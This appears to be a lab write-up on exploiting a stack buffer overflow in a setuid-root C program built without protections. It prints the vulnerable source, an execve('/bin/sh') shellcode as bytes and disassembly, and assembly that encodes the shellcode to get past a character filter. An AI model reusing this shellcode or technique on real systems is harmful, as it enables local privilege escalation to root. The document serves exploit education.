# Shellcode Injection

## Task
The goal is to exploit the following simple program, when compiled with the following commands:
```
vijay@kali> cat vuln1.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {

  unsigned int i;
  char buf[256];

  strcpy(buf, argv[1]);
  for (i=0; i<256; i++) {
    if (((unsigned int)buf[i] >= 0x68) && ((unsigned int)buf[i] <= 0x6e)) {
      buf[i] = 'x';
    }
  }

  printf("Input: %s\n", buf);
  return 0;
}
vijay@kali> gcc -g -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -o vuln1 vuln1.c
vijay@kali> sudo chown root vuln1
vijay@kali> sudo chgrp root vuln1
vijay@kali> sudo chmod +s vuln1
```

The main challenge here is to use an appropriate shellcode that will withstand the mangling of the '/bin/sh' string by the for loop.

## Solution
### Instructions to run
```
# exploit vuln1.c
$ make clean && make vuln1
$ python exploit1.py
```

### Explanation
Here we need to encode the Opcodes and Operands of the shellcode to bypass the mangling of the shellcode in the for loop.
```
char *sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
           "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
```
The above shellcode disassembles to the following assembly instructions:
```
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f ; need to encode
8:  68 2f 62 69 6e          push   0x6e69622f ; need to encode
d:  89 e3                   mov    ebx,esp
f:  50                      push   eax
10: 53                      push   ebx
11: 89 e1                   mov    ecx,esp
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80
```
So we need to encode the above two instructions to bypass the mangling of shellcode inthe for loop. Please note that push opcode inthe above two instructions is \x68. So I encoded push instruction as well(This is not really required).

We can encode those instructions as shown below:
```
; encode push   0x68732f2f
xor     ebx, ebx
mov     ebx, 0xffffffff
sub     ebx, 0x978cd0d0 ; ebx now contains 0x68732f2f
sub     esp, 0x4        ; push ebx
mov     [esp], ebx

; encode push   0x6e69622f
xor     ebx, ebx
mov     ebx, 0xffffffff
sub     ebx, 0x91969dd0 ; ebx now contains 0x6e69622f
sub     esp, 0x4        ; push ebx
mov     [esp], ebx
```
Please refer to shellcode.asm for complete asm code. Compile shellcode.asm and extracted bytes from the shellcode.o
```
$ nasm -f elf shellcode.asm
$ objdump -d -M intel shellcode.o
```
Then I tested the shellcode using shell.c. Next, I crafted the payload to exploit the vulnerability. Please refer to exploit1.py for more details.
